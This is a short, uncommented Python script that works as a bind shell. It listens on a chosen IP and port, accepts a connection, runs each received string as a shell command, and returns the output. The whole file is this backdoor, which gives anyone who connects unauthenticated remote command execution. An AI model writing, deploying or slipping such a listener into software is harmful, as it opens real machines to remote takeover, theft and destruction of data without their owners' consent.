import subprocess
import socket

print(socket.gethostbyname(socket.gethostname()))
s = socket.socket()
host = input("IP:")
port = int(input("Port:"))

s.bind((host, port))
s.listen()
C_Sock, addr = s.accept()
print("Succes")
while True:
    try:
        data = C_Sock.recv(4096)
        rpcs = subprocess.Popen(data.decode(), shell=True, stdout=subprocess.PIPE)
        out = rpcs.stdout.read()
        C_Sock.send(b"[+] " + out)
    except:
        print("Error")
        raise
